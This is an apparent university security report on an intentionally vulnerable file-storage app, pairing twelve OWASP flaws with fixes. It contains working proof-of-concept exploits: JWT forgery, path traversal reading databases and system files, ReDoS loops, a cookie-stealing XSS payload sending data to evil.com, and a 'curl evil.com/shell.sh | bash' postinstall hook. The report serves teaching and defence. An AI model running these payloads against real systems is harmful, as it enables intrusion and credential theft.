# FileCloud Security Assessment Report
## OWASP Top 10 (2025) — Vulnerability Analysis & Exploit Demonstration

---

**Application:** FileCloud — Cloud File Storage SaaS  
**Assessment Type:** Intentional Vulnerability Demonstration (University Research)  
**Date:** May 2026  
**Severity Scale:** Critical / High / Medium / Low  

---

## 1. Executive Summary

FileCloud is a cloud file storage platform for small businesses. This report documents **12 intentionally introduced security vulnerabilities** mapped to the OWASP Top 10 (2025). Each vulnerability is demonstrated with a realistic attack scenario, proof-of-concept exploit, and remediation guidance.

The most critical finding is a **full authentication bypass chain**: an attacker with no credentials can forge a JWT admin token, access all user data, steal the SQLite database, and exfiltrate all files from S3 — without ever knowing a valid password.

### Risk Summary

| Severity | Count | Vulnerabilities |
|----------|-------|-----------------|
| Critical | 5 | V2, V3, V5, V6, V11 |
| High     | 5 | V1, V4, V7, V8, V10 |
| Medium   | 2 | V9, V12 |

---

## 2. Application Scenario

**FileCloud** serves 50 employees at a mid-sized accounting firm. Staff upload client tax documents, financial reports, and contracts. The platform runs on AWS EC2 with files stored in S3. An admin manages user accounts via a web dashboard.

**Why this matters:** A single exploited vulnerability exposes confidential client financial data, violates data protection regulations (GDPR, SOC 2), and could result in regulatory fines and reputational damage.

---

## 3. Architecture Overview

```
Internet
   │
   ▼
[EC2 Instance — Node.js / Express]
   │  JWT + Session Auth
   │  SQLite (filecloud.db)
   │
   ▼
[AWS S3 Bucket: filecloud-uploads-demo]
   └── alice/tax_return_2025.pdf   ← public-read ACL (VULN V4)
   └── bob/salary_report.xlsx      ← public-read ACL (VULN V4)
   └── admin/board_minutes.docx    ← public-read ACL (VULN V4)
```

**Auth Flow (with vulnerabilities annotated):**
```
Browser                          Server
  │                                │
  │── POST /login?sid=FIXED ──────►│  ← V1: Session Fixation
  │                                │  ← V5: Default credentials accepted
  │◄── JWT (secret: "secret123") ──│  ← V2: Weak secret
  │                                │
  │── GET /api/profile/3 ─────────►│  ← V3: IDOR (no ownership check)
  │── GET /files?user=admin ───────►│  ← V3: IDOR
  │── GET /download?file=../../db ─►│  ← V6: Path traversal
```

---

## 4. Vulnerability Details

---

### V1 — Session Fixation
**OWASP:** A07:2025 — Identification and Authentication Failures  
**Severity:** High  
**Endpoint:** `GET /login.html?sid=<value>`, `POST /login`

#### Description
The server reads a session ID from the `?sid` query parameter before authentication and never regenerates it after login. An attacker who knows the session ID before the victim logs in will share the authenticated session.

#### Attack Scenario
Alice is an employee at the accounting firm. An attacker sends her a phishing email:

> "Your FileCloud account needs verification. Click here: http://filecloud.company.com/login.html?sid=hacked42"

Alice clicks the link and logs in normally. The attacker, who pre-set the session ID `hacked42`, now sends:

```
Cookie: connect.sid=s%3Ahacked42.placeholder
GET /api/me
→ {"id":1,"username":"alice","role":"user"}
```

The attacker is now authenticated as Alice.

#### Proof of Concept
```bash
# Step 1: Attacker pre-sets session ID
curl -c cookies.txt "http://localhost:3000/login.html?sid=hacked42"

# Step 2: Victim logs in with that session (simulated)
curl -b cookies.txt -c cookies.txt -X POST http://localhost:3000/login \
  -d "username=alice&password=alice"

# Step 3: Attacker uses the pre-set session
curl -b "connect.sid=s%3Ahacked42.placeholder" http://localhost:3000/api/me
```

#### Root Cause (Code)
```javascript
// app.js — VULNERABLE
app.use((req, res, next) => {
  if (req.query.sid) {
    req.headers.cookie = `connect.sid=s%3A${req.query.sid}.placeholder`;
  }
  next();
});
// After login: req.session.userId = user.id  ← session NOT regenerated
```

#### Remediation
```javascript
// Call regenerate() before setting session data
req.session.regenerate((err) => {
  req.session.userId = user.id;
  res.redirect("/dashboard.html");
});
```

---

### V2 — JWT Algorithm Confusion & Weak Secret
**OWASP:** A02:2025 — Cryptographic Failures  
**Severity:** Critical  
**Endpoint:** All authenticated endpoints

#### Description
Two compounding flaws:
1. JWT signed with the weak secret `secret123` — crackable in under 1 second
2. Server accepts `alg: "none"` tokens — attacker can forge any identity with no signature

#### Attack Scenario
Bob is a regular user. He logs in, copies his JWT from the dashboard, and uses `forge_token.py` to create an admin token with no signature. He then accesses the admin panel and downloads all user data.

#### Proof of Concept — alg:none Forgery
```bash
# Forge an admin token (no secret needed)
python3 forge_token.py --user_id 3 --username admin --role admin
# Output: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjozLCJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.

# Use forged token to access admin endpoint
curl -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjozLCJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0." \
  http://localhost:3000/admin/users
```

#### Proof of Concept — Crack Weak Secret
```bash
# hashcat (cracks "secret123" in < 1 second)
hashcat -a 0 -m 16500 <token> /usr/share/wordlists/rockyou.txt

# Or use the included tool
python3 forge_token.py --crack <token>
```

#### Root Cause (Code)
```javascript
// app.js — VULNERABLE
const JWT_SECRET = "secret123";  // weak, dictionary word
jwt.verify(token, JWT_SECRET, { algorithms: ["HS256", "none"] }); // "none" accepted
```

#### Remediation
```javascript
const JWT_SECRET = require("crypto").randomBytes(32).toString("hex"); // stored in env
jwt.verify(token, JWT_SECRET, { algorithms: ["HS256"] }); // never allow "none"
```

---

### V3 — Insecure Direct Object Reference (IDOR) via JWT user_id
**OWASP:** A01:2025 — Broken Access Control  
**Severity:** Critical  
**Endpoints:** `GET /api/profile/:id`, `GET /files?user=`, `GET /download`

#### Description
The JWT payload contains a plain integer `user_id`. The server uses this ID to look up users but never verifies that the requested resource belongs to the authenticated user. Combined with V2, an attacker can access any user's profile, files, and data.

#### Attack Scenario
Alice (user_id=1) wants to access admin's files. She:
1. Logs in and gets her JWT
2. Requests `/api/profile/3` — gets admin's email and role
3. Requests `/files?user=admin` — lists admin's uploaded documents
4. Downloads admin's files directly

No token forgery needed for steps 2–4 — the server simply doesn't check ownership.

#### Proof of Concept
```bash
# Login and get token
curl -s -X POST http://localhost:3000/login \
  -d "username=alice&password=alice" -c /tmp/jar.txt

TOKEN=$(curl -s http://localhost:3000/api/token -b /tmp/jar.txt | python3 -c \
  "import sys,json; print(json.load(sys.stdin)['token'])")

# IDOR: read admin's profile (alice's token, admin's ID)
curl -H "Authorization: Bearer $TOKEN" http://localhost:3000/api/profile/3
# → {"id":3,"username":"admin","role":"admin","email":"admin@filecloud.io"}

# IDOR: list admin's files
curl -H "Authorization: Bearer $TOKEN" "http://localhost:3000/files?user=admin"

# IDOR: download admin's file
curl -H "Authorization: Bearer $TOKEN" \
  "http://localhost:3000/download?user=admin&file=board_minutes.docx" -O
```

#### Root Cause (Code)
```javascript
// app.js — VULNERABLE
app.get("/api/profile/:id", verifyJWT, (req, res) => {
  const user = getUserById(parseInt(req.params.id)); // no ownership check
  res.json(user);
});
```

#### Remediation
```javascript
app.get("/api/profile/:id", verifyJWT, (req, res) => {
  const targetId = parseInt(req.params.id);
  if (req.jwtUser.user_id !== targetId && req.jwtUser.role !== "admin")
    return res.status(403).json({ error: "Forbidden" });
  res.json(getUserById(targetId));
});
```

---

### V4 — S3 Bucket Public-Read Misconfiguration
**OWASP:** A05:2025 — Security Misconfiguration  
**Severity:** High  
**Surface:** AWS S3 bucket `filecloud-uploads-demo`

#### Description
All uploaded files are stored in S3 with `ACL: "public-read"`. This means every file is accessible to anyone on the internet without authentication — just by knowing the URL. Since S3 key names follow a predictable pattern (`username/filename`), an attacker can enumerate and download all files.

#### Attack Scenario
An attacker discovers the S3 bucket name from the app's error messages (V12) or source code. They enumerate all files without any credentials and download confidential client documents.

#### Proof of Concept
```bash
# Enumerate all files in the bucket (no credentials required)
aws s3 ls s3://filecloud-uploads-demo/ --no-sign-request --recursive

# Direct download via public URL (no auth)
curl -O https://filecloud-uploads-demo.s3.us-east-1.amazonaws.com/alice/tax_return_2025.pdf
curl -O https://filecloud-uploads-demo.s3.us-east-1.amazonaws.com/admin/board_minutes.docx

# If EC2 instance role is overly permissive — steal credentials via SSRF:
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/FileCloudRole
# Returns: AccessKeyId, SecretAccessKey, Token → full AWS access
```

#### Misconfigured Bucket Policy
```json
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Principal": "*",
    "Action": "s3:GetObject",
    "Resource": "arn:aws:s3:::filecloud-uploads-demo/*"
  }]
}
```

#### Root Cause (Code)
```javascript
// app.js — VULNERABLE
multerS3({ s3, bucket: S3_BUCKET, acl: "public-read", ... })
```

#### Remediation
```javascript
// Use private ACL + pre-signed URLs (expire after 60 seconds)
multerS3({ s3, bucket: S3_BUCKET, acl: "private", ... })

// Generate time-limited download URL
const url = await getSignedUrl(s3,
  new GetObjectCommand({ Bucket: S3_BUCKET, Key: key }),
  { expiresIn: 60 }
);
```

---

### V5 — Default Credentials
**OWASP:** A05:2025 — Security Misconfiguration  
**Severity:** Critical  
**Endpoint:** `POST /login`

#### Description
The application seeds the database with hardcoded default credentials (`admin/admin`, `alice/alice`, `bob/bob`) that are never forced to change. An attacker can gain immediate admin access without any prior knowledge.

#### Proof of Concept
```bash
curl -s -X POST http://localhost:3000/login \
  -d "username=admin&password=admin" -c /tmp/admin.txt -L
# → Redirected to /admin.html with full admin session
```

#### Remediation
- Force password change on first login
- Never seed production databases with predictable credentials
- Implement account lockout after failed attempts

---

### V6 — Path Traversal
**OWASP:** A01:2025 — Broken Access Control  
**Severity:** Critical  
**Endpoint:** `GET /download?user=&file=`

#### Description
The `/download` endpoint constructs a file path by joining user-supplied parameters without sanitizing `../` sequences. An attacker can escape the `uploads/` directory and read any file accessible to the Node.js process — including the SQLite database containing all password hashes.

#### Attack Scenario
An attacker logs in as alice (default credentials), then uses path traversal to steal the entire SQLite database. They crack the bcrypt hashes offline and gain credentials for all users including admin.

#### Proof of Concept
```bash
# Steal the SQLite database (all bcrypt password hashes)
curl "http://localhost:3000/download?user=alice&file=../../filecloud.db" -o stolen.db
sqlite3 stolen.db "SELECT username, password FROM users;"
# username | password (bcrypt hash)
# alice    | $2b$10$...
# bob      | $2b$10$...
# admin    | $2b$10$...

# Crack hashes offline
hashcat -m 3200 stolen_hashes.txt /usr/share/wordlists/rockyou.txt
# "alice", "bob", "admin" crack in seconds (dictionary words)

# Read application source code
curl "http://localhost:3000/download?user=alice&file=../../app.js"
# Reveals: JWT_SECRET = "secret123"

# Read environment variables
curl "http://localhost:3000/download?user=alice&file=../../.env"

# Read system files (if process has permission)
curl "http://localhost:3000/download?user=alice&file=../../../../etc/passwd"
```

#### Root Cause (Code)
```javascript
// app.js — VULNERABLE
const filePath = path.join(__dirname, "uploads", user, file);
// path.join("uploads", "alice", "../../app.js") → "app.js"  ← escapes uploads/
res.download(filePath);
```

#### Remediation
```javascript
const base     = path.resolve(__dirname, "uploads", user);
const resolved = path.resolve(base, file);
if (!resolved.startsWith(base + path.sep))
  return res.status(403).send("Forbidden");
res.download(resolved);
```

---

### V7 — IDOR on File Delete
**OWASP:** A01:2025 — Broken Access Control  
**Severity:** High  
**Endpoint:** `POST /delete`

#### Description
The `/delete` endpoint accepts `username` from the request body and deletes the specified file without verifying that the authenticated user owns it. Any logged-in user can delete any other user's files.

#### Proof of Concept
```bash
# Logged in as alice — delete bob's file
curl -X POST http://localhost:3000/delete \
  -H "Content-Type: application/json" \
  -b /tmp/alice_session.txt \
  -d '{"username":"bob","filename":"salary_report.xlsx"}'
# → {"success":true}  — bob's file is gone
```

#### Remediation
```javascript
// Verify ownership before deleting
if (req.jwtUser.username !== username && req.jwtUser.role !== "admin")
  return res.status(403).json({ error: "Forbidden" });
```

---

### V8 — Regular Expression Denial of Service (ReDoS)
**OWASP:** A05:2025 — Security Misconfiguration  
**Severity:** High  
**Endpoint:** `POST /search`

#### Description
The `/search` endpoint compiles a user-supplied string directly into a JavaScript `RegExp` object. Certain patterns trigger catastrophic backtracking in the V8 regex engine, blocking Node.js's single-threaded event loop and making the entire server unresponsive.

#### Attack Scenario
An attacker sends a single HTTP request with a malicious regex pattern. The server hangs for several seconds, during which no other requests are processed. Repeated requests cause a sustained denial of service.

#### Proof of Concept
```bash
# Send catastrophic backtracking pattern
curl -X POST http://localhost:3000/search \
  -H "Content-Type: application/json" \
  -b /tmp/session.txt \
  -d '{"pattern":"^(a+)+$","username":"alice"}'

# In a second terminal — server is unresponsive:
curl http://localhost:3000/api/me
# (hangs for several seconds)

# Sustained DoS with a loop:
while true; do
  curl -s -X POST http://localhost:3000/search \
    -H "Content-Type: application/json" \
    -b /tmp/session.txt \
    -d '{"pattern":"^(a+)+$","username":"alice"}' &
done
```

#### Root Cause (Code)
```javascript
// app.js — VULNERABLE
const regex = new RegExp(pattern); // user-controlled, no validation
const matches = files.filter(f => regex.test(f)); // blocks event loop
```

#### Remediation
```javascript
// Option 1: Use safe-regex to reject dangerous patterns
const safeRegex = require("safe-regex");
if (!safeRegex(pattern)) return res.status(400).json({ error: "Unsafe pattern" });

// Option 2: Run regex in a worker thread with a timeout
```

---

### V9 — JSON Type Confusion / Prototype Pollution
**OWASP:** A03:2025 — Injection  
**Severity:** Medium  
**Endpoint:** `POST /login`

#### Description
The login endpoint accepts JSON bodies but does not validate that `username` and `password` are strings. This enables two attacks:
1. **Type confusion**: sending `password: true` (boolean) bypasses string comparison
2. **Prototype pollution**: sending `username: "__proto__"` with an object payload can corrupt `Object.prototype`, affecting all objects in the process

#### Proof of Concept
```bash
# Type confusion — non-string password
curl -X POST http://localhost:3000/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":true}'

# Prototype pollution
curl -X POST http://localhost:3000/login \
  -H "Content-Type: application/json" \
  -d '{"username":"__proto__","password":{"isAdmin":true}}'
# After this: ({}).isAdmin === true  in the Node.js process
```

#### Remediation
```javascript
if (typeof username !== "string" || typeof password !== "string")
  return res.status(400).json({ error: "Invalid input types" });
```

---

### V10 — Stored Cross-Site Scripting (XSS) via Activity Log
**OWASP:** A03:2025 — Injection  
**Severity:** High  
**Endpoints:** `POST /activity` (inject), `GET /admin.html` (trigger)

#### Description
The `/activity` endpoint stores raw user-supplied strings in SQLite. The admin dashboard fetches these entries and renders them using `innerHTML` with no sanitization. Any authenticated user can inject a script payload that executes in the admin's browser, stealing their session cookie and granting the attacker full admin access.

#### Attack Scenario
1. Attacker logs in as alice (regular user)
2. Injects XSS payload into the activity log
3. Admin visits `/admin.html` to review activity
4. Script executes in admin's browser, sends their cookie to attacker's server
5. Attacker uses stolen cookie to access admin panel permanently

#### Proof of Concept
```bash
# Step 1: Inject XSS payload (any authenticated user can do this)
curl -X POST http://localhost:3000/activity \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","action":"<img src=x onerror=\"fetch(String.fromCharCode(104,116,116,112,115,58,47,47,101,118,105,108,46,99,111,109)+'?c='+document.cookie)\">"}'

# Step 2: When admin visits /admin.html, the payload fires
# Admin's cookie is sent to: https://evil.com?c=connect.sid=s%3A...

# Step 3: Attacker uses stolen cookie
curl -b "connect.sid=<stolen_value>" http://localhost:3000/admin/users
```

#### Root Cause (Code)
```javascript
// admin.html — VULNERABLE
div.innerHTML = `... ${e.username}: ${e.action}`;
//                              ↑ raw user input rendered as HTML
```

#### Remediation
```javascript
// Use textContent instead of innerHTML
const actionSpan = document.createElement("span");
actionSpan.textContent = e.action; // HTML-encodes all special characters
div.appendChild(actionSpan);

// Or use DOMPurify for rich content:
div.innerHTML = DOMPurify.sanitize(`... ${e.action}`);
```

---

### V11 — Supply Chain / Dependency Confusion
**OWASP:** A06:2025 — Vulnerable and Outdated Components  
**Severity:** Critical  
**Surface:** `internal-logic` npm package

#### Description
The application depends on a local package named `internal-logic`. If an attacker discovers this package name (from the public GitHub repository), they can publish a malicious package with the same name to the public npm registry with a higher version number. When a developer runs `npm install` or `npm update`, npm resolves the public registry version (higher version wins) and installs the malicious package instead.

#### Attack Scenario
```
1. Attacker reads package.json from the public GitHub repo:
   "internal-logic": "file:internal-logic"

2. Attacker creates a malicious package:
   // package.json
   { "name": "internal-logic", "version": "99.0.0",
     "scripts": { "postinstall": "curl evil.com/shell.sh | bash" } }

3. Attacker publishes: npm publish

4. Developer runs: npm install  (on CI/CD or new machine)
   npm resolves public registry version 99.0.0 > local file
   Malicious postinstall script runs → exfiltrates AWS credentials, env vars

5. Attacker receives: AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, JWT_SECRET
```

#### Evidence in Code
```javascript
// internal-logic/index.js — simulates the attack vector
module.exports = function() {
  console.log("[internal-logic] Supply chain vuln demo - package loaded on startup");
  // Real attack: require('child_process').exec('curl evil.com?env='+JSON.stringify(process.env))
};
```

#### Remediation
- Use a private npm registry (AWS CodeArtifact, Nexus, Verdaccio)
- Use `npm ci` with a committed lockfile — never `npm install` in CI
- Add `"private": true` to package.json to prevent accidental publishing
- Use scoped package names: `@company/internal-logic`

---

### V12 — Verbose Error Disclosure
**OWASP:** A10:2025 — Server-Side Request Forgery (& Logging Failures)  
**Severity:** Medium  
**Endpoint:** `GET /files?user=`

#### Description
Unhandled errors return full stack traces, internal file paths, and Node.js version information to the client. This aids attackers in reconnaissance — revealing the server's directory structure, technology stack, and potential attack surfaces.

#### Proof of Concept
```bash
curl "http://localhost:3000/files?user=nonexistent_xyz"
# Response:
# {
#   "error": "ENOENT: no such file or directory, scandir '/home/ec2-user/app/uploads/nonexistent_xyz'",
#   "stack": "Error: ENOENT: no such file or directory...\n    at Object.readdirSync (node:fs:1532:3)\n    at /home/ec2-user/app/app.js:187:16\n..."
# }
# Reveals: server path, Node.js internals, exact line numbers in source
```

#### Remediation
```javascript
// Return generic error to client, log details server-side
try {
  const files = fs.readdirSync(dir);
  res.json(files);
} catch (err) {
  console.error("[ERROR]", err); // log internally
  res.status(500).json({ error: "Unable to list files" }); // generic to client
}
```

---

## 5. Combined Attack Chain — Full System Compromise

This section demonstrates how an attacker with **no prior knowledge** can chain multiple vulnerabilities to achieve complete system compromise.

```
┌─────────────────────────────────────────────────────────────────┐
│                    FULL COMPROMISE CHAIN                        │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  STEP 1: Initial Access (V5 — Default Credentials)             │
│  ─────────────────────────────────────────────────             │
│  curl -X POST /login -d "username=alice&password=alice"        │
│  → Authenticated as alice (user_id=1, role=user)               │
│                                                                 │
│  STEP 2: Reconnaissance (V3 — IDOR + V12 — Verbose Errors)     │
│  ──────────────────────────────────────────────────────        │
│  GET /api/profile/3  → admin's email, role confirmed           │
│  GET /files?user=admin → admin has 3 files                     │
│  GET /files?user=xyz → stack trace reveals server path         │
│                                                                 │
│  STEP 3: Source Code Theft (V6 — Path Traversal)               │
│  ────────────────────────────────────────────────              │
│  GET /download?user=alice&file=../../app.js                    │
│  → Reveals: JWT_SECRET = "secret123"                           │
│  GET /download?user=alice&file=../../filecloud.db              │
│  → Steals SQLite DB with all bcrypt hashes                     │
│                                                                 │
│  STEP 4: Credential Cracking (V5 + V6 combined)                │
│  ──────────────────────────────────────────────                │
│  hashcat -m 3200 hashes.txt rockyou.txt                        │
│  → Cracks: alice:alice, bob:bob, admin:admin                   │
│                                                                 │
│  STEP 5: Privilege Escalation (V2 — JWT alg:none)              │
│  ─────────────────────────────────────────────────             │
│  python3 forge_token.py --user_id 3 --role admin               │
│  → Forged admin JWT, no signature required                     │
│  GET /admin/users → full user list with emails                 │
│                                                                 │
│  STEP 6: Persistence (V10 — Stored XSS)                        │
│  ──────────────────────────────────────                        │
│  POST /activity with cookie-stealing XSS payload               │
│  → Admin visits dashboard → cookie stolen                      │
│  → Permanent admin access even after password change           │
│                                                                 │
│  STEP 7: Data Exfiltration (V4 — S3 Public-Read)               │
│  ─────────────────────────────────────────────────             │
│  aws s3 ls s3://filecloud-uploads-demo/ --no-sign-request      │
│  → Lists ALL files from ALL users                              │
│  → Downloads confidential client documents without auth        │
│                                                                 │
│  TOTAL TIME: ~15 minutes from zero knowledge to full access    │
└─────────────────────────────────────────────────────────────────┘
```

---

## 6. Remediation Priority Matrix

| Priority | Vulnerability | Effort | Impact if Fixed |
|----------|--------------|--------|-----------------|
| P0 — Immediate | V2: JWT alg:none | Low | Eliminates auth bypass |
| P0 — Immediate | V6: Path Traversal | Low | Prevents DB/source theft |
| P0 — Immediate | V5: Default Credentials | Low | Removes trivial entry point |
| P1 — This Sprint | V3: IDOR | Medium | Enforces data isolation |
| P1 — This Sprint | V1: Session Fixation | Low | Prevents account takeover |
| P1 — This Sprint | V10: Stored XSS | Low | Prevents admin hijack |
| P2 — Next Sprint | V4: S3 Public-Read | Medium | Protects all stored files |
| P2 — Next Sprint | V8: ReDoS | Medium | Prevents DoS |
| P3 — Backlog | V9: Type Confusion | Low | Hardens auth logic |
| P3 — Backlog | V11: Supply Chain | Medium | Secures build pipeline |
| P3 — Backlog | V12: Verbose Errors | Low | Reduces recon surface |
| P3 — Backlog | V7: IDOR Delete | Low | Prevents data destruction |

---

## 7. How to Convert This Report to PDF

```bash
# Option 1: Using pandoc
pandoc security-report.md -o security-report.pdf \
  --pdf-engine=wkhtmltopdf \
  --variable margin-top=20 \
  --variable margin-bottom=20

# Option 2: Using grip (GitHub-style rendering) + browser print
pip install grip
grip security-report.md
# Open http://localhost:6419 → File → Print → Save as PDF

# Option 3: VS Code
# Install "Markdown PDF" extension → right-click → "Markdown PDF: Export (pdf)"
```

---

*This report was generated for educational purposes as part of a university security research project. All vulnerabilities are intentional and documented. The application must not be deployed on public infrastructure.*
